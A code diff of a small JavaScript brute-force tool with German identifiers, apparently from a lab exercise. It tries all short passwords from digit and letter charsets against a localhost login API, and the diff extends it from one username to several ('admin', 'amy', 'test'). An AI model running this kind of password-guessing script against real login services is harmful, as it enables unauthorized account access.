@@ -1,28 +1,14 @@
 "use strict";
 
+const {login} = require("./login");
+
 const MONO_CHARSETS = {
     digits: "0123456789",
     lowercase: "abcdefghijklmnopqrstuvwxyz",
     uppercase: "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
 }
 
-async function login(nutzer, password) {
-  const response = await fetch("http://localhost:3000/api/auth/login", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify({
-      username: nutzer,
-      password: password,
-    }),
-  });
 
-  if (response.status === 429) {
-    throw new Error("Rate limit exceeded. Please try again later.");
-  }
-  return response.status === 200;
-}
 
 function* kombinationen(zeichensatz, laenge) {
   if (laenge === 0) {
@@ -61,22 +47,27 @@ async function bruteForceMono(nutzer, zeichensatz, maxLaenge) {
 }
 
 async function main() {
-    const nutzer = "sterni8"
+    const usernames = ["admin", "amy", "test"];
 
-    for (const [name, zeichensatz] of Object.entries(MONO_CHARSETS)) {
-        console.log(`\nAngriff mit Zeichensatz: ${name} (${zeichensatz})`);
-        const start = Date.now();
-        const {gefunden, versuche} = await bruteForceMono(nutzer, zeichensatz, 3);
-        const dauerSekunden = (Date.now() - start) / 1000;
+    console.log(`\n--- Angriff auf Benutzer ---`);
 
-        console.log(`Angriffsziel:      username="${nutzer}"`);
-        console.log(`Passwort gefunden: ${gefunden}`);
-        console.log(`Anzahl Versuche:   ${versuche}`);
-        console.log(`Dauer:             ${dauerSekunden.toFixed(3)} Sekunden`);
+    for (const username of usernames) {
+        console.log(`\nAngriffsziel: ${username}`);
+        for (const [name, zeichensatz] of Object.entries(MONO_CHARSETS)) {
+            console.log(`\nAngriff mit Zeichensatz: ${name} (${zeichensatz})`);
+            const start = Date.now();
+            const {gefunden, versuche} = await bruteForceMono(username, zeichensatz, 3);
+            const dauerSekunden = (Date.now() - start) / 1000;
 
-        if (gefunden) {
-            console.log(`Erfolgreich! Das Passwort für den Nutzer "${nutzer}" ist: ${gefunden}`);
-            return;
+            console.log(`Angriffsziel:      username="${username}"`);
+            console.log(`Passwort gefunden: ${gefunden}`);
+            console.log(`Anzahl Versuche:   ${versuche}`);
+            console.log(`Dauer:             ${dauerSekunden.toFixed(3)} Sekunden`);
+
+            if (gefunden) {
+                console.log(`Erfolgreich! Das Passwort für den Nutzer "${username}" ist: ${gefunden}`);
+                return;
+            }
         }
     }
 
